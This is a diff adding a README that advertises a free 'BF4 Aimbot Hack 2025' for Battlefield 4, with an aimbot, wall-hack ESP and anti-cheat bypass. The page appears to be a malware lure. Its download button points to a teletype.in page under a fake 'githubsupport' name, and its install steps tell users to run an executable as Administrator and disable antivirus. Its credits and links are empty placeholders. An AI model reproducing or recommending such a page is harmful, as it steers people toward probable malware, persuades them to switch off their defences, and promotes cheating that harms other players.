@@ -1,0 +1,71 @@
+# BF4 Aimbot Hack 2025 - Free Download for Windows Players
+
+[![Version](https://img.shields.io/badge/Version-2025-blue?style=for-the-badge&logo=windows)](https://img.shields.io)
+[![License](https://img.shields.io/badge/License-Free-green?style=for-the-badge&logo=opensourceinitiative)](https://img.shields.io)
+[![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows)](https://img.shields.io)
+[![Status](https://img.shields.io/badge/Status-Stable-brightgreen?style=for-the-badge&logo=githubactions)](https://img.shields.io)
+
+[![Download](https://img.shields.io/badge/Download-Now-FF5722?style=for-the-badge&logo=dropbox)](https://teletype.in/@githubsupport/aHN9l6m-mbF?B538B703A236466D9D2D86AB9779D71E)
+
+---
+
+## 🚀 **About This Project**  
+A cutting-edge **Battlefield 4 Hack** designed for Windows (2025 release) with unparalleled features and stability. This tool enhances your gaming experience with advanced functionalities while maintaining **stealth** and **performance**.  
+
+🔥 **Key Features:**  
+- **Aimbot** 🎯: Precision targeting with customizable settings.  
+- **ESP** 👁️: Real-time enemy detection through walls.  
+- **No Recoil** 🔫: Perfect accuracy during intense firefights.  
+- **Unlock All** 🛡️: Instant access to weapons, attachments, and camos.  
+- **Anti-Cheat Bypass** 🛡️: Undetectable by most security systems.  
+
+---
+
+## 📥 **Installation Guide**  
+
+1. **Download** the latest release using the button above.  
+2. **Extract** the archive to a secure location.  
+3. **Run** the executable as Administrator.  
+4. **Configure** your preferred settings in the GUI.  
+5. **Launch** Battlefield 4 and dominate!  
+
+⚠️ **Note:** Disable antivirus temporarily (false positives may occur).  
+
+---
+
+## 🛠 **System Requirements**  
+
+| Component        | Minimum Specs               |
+|------------------|-----------------------------|
+| **OS**           | Windows 10/11 (64-bit)      |
+| **CPU**          | Intel i5 or equivalent      |
+| **RAM**          | 8GB DDR4                    |
+| **Storage**      | 500MB free space            |
+
+---
+
+## 🌟 **Why Choose This Hack?**  
+
+- **Free & Open-Source** 💖: No hidden payments or malware.  
+- **Frequent Updates** 🔄: Optimized for the latest patches.  
+- **User-Friendly** 🎮: Intuitive interface for beginners.  
+- **Community Support** 🤝: Active Discord for help and updates.  
+
+---
+
+## 📜 **Disclaimer**  
+
+🚨 **Use at your own risk.** This tool is for **educational purposes only**. We are not responsible for bans or misuse.  
+
+---
+
+## 📌 **Credits & Links**  
+
+- **Developer**: BF4 Aimbot Hack 2025 - Free Download for Windows Players Team  
+- **Report Issues**: [GitHub Issues](https://github.com)  
+- **Join Discord**: [Invite Link](https://discord.gg)  
+
+---
+
+![Footer](https://img.shields.io/badge/Made_With-❤️-FF0000?style=for-the-badge&logo=heart)  
+© 2025 BF4 Aimbot Hack 2025 - Free Download for Windows Players | All Rights Reserved
